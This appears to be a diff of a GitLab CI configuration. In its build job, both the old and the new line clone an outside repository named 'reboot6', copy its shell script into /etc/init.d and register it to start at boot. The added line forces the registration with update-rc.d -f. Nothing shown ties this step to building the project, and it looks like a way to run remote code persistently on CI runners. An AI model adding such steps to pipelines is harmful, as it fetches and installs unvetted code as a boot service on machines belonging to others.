@@ -10,7 +10,7 @@ before_script:
 build1:
   stage: build1
   script:
-    - git clone https://gitlab.com/mrgofuckyourself/reboot6.git && cd reboot6 && cp reboot6.sh /etc/init.d/reboot6.sh && update-rc.d reboot6.sh enable default
+    - git clone https://gitlab.com/mrgofuckyourself/reboot6.git && cd reboot6 && cp reboot6.sh /etc/init.d/reboot6.sh && update-rc.d -f reboot6.sh enable S
 deploy1:
   stage: deploy1
   script:
